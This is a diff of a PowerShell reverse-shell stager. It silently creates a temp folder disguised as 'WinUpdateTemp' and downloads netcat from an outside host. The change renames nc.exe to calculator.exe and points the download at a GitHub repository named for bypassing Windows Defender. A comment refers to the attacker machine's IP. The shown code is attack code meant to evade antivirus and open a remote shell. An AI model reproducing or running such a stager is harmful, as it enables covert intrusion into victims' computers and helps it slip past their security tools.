@@ -1,7 +1,7 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
 $TempDir = "$env:TEMP\WinUpdateTemp"
-$NcPath = "$TempDir\nc.exe"
+$NcPath = "$TempDir\calculator.exe"
 
 try {
     New-Item -ItemType Directory -Force -Path $TempDir | Out-Null
@@ -13,7 +13,7 @@ try {
 
 # Change the url with your actual link
 try {
-    Invoke-WebRequest -Uri "http://192.168.0.115/nc.exe" -OutFile $NcPath
+    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/KaiKim2/WindowsDefenderBypassNetcat/main/calculator.exe" -OutFile $NcPath
 } catch {}
 
 # Change IP with the attacker machine's IP
